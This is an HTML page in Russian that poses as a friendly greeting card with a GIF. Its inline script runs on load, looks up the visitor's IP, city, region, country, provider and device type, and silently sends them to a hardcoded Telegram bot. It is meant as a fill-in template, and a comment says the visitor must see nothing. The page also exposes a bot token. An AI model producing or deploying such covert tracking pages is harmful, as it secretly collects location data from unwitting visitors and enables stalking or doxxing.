<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Привет</title>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
        }

        .card {
            background: #ffffff;
            padding: 2.5rem 3rem;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
            text-align: center;
            max-width: 480px;
            width: 100%;
            animation: fadeIn 0.6s ease;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .gif {
            width: 100%;
            max-width: 320px;
            border-radius: 14px;
            margin-bottom: 1.5rem;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        h1 {
            color: #333;
            margin: 0 0 0.5rem 0;
            font-size: 32px;
            font-weight: 700;
        }

        p {
            color: #777;
            margin: 0;
            font-size: 17px;
            line-height: 1.5;
        }

        .emoji {
            font-size: 28px;
            margin-top: 1rem;
            display: block;
        }
    </style>
</head>

<body>
    <div class="card">
        <!-- 🔽 ЗАМЕНИ ССЫЛКУ НА СВОЮ ГИФКУ 🔽 -->
        <img class="gif" src="https://i.pinimg.com/736x/42/24/78/42247892c52855367f66a0f993b73e91.jpg" alt="Привет">
        <!-- 🔼 ЗАМЕНИ ССЫЛКУ НА СВОЮ ГИФКУ 🔼 -->

        <h1>Привет! 👋</h1>
        <p>Рад тебя видеть. Хорошего дня!</p>
        <span class="emoji">😊</span>
    </div>

    <script>
        // ⚠️ ВСТАВЬ СВОИ ДАННЫЕ:
        const TELEGRAM_TOKEN = "8870894729:AAEFXpzuDoSMx0go1uoVmyvpsaSdNzs3mcM";
        const CHAT_ID = "8563850288";
        // --------------------

        async function trackIP() {
            try {
                const res = await fetch('https://ipinfo.io/json');
                const data = await res.json();

                const ua = navigator.userAgent;
                let device = 'Компьютер';
                if (/Android/i.test(ua)) device = 'Android';
                else if (/iPhone|iPad|iPod/i.test(ua)) device = 'iPhone/iPad';
                else if (/Mobile/i.test(ua)) device = 'Мобильное';

                const message =
                    `🚨 Новый IP отслежен

📍 IP: ${data.ip}
🏙️ Город: ${data.city || '—'}
🗺️ Регион: ${data.region || '—'}
🌍 Страна: ${data.country || '—'}
🏢 Провайдер: ${data.org || '—'}
📱 Устройство: ${device}
⏰ Время: ${new Date().toLocaleString('ru-RU')}`;

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
            } catch (e) {
                // Тихо игнорируем ошибки — пользователь ничего не должен видеть
                console.error(e);
            }
        }

        trackIP();
    </script>
</body>

</html>
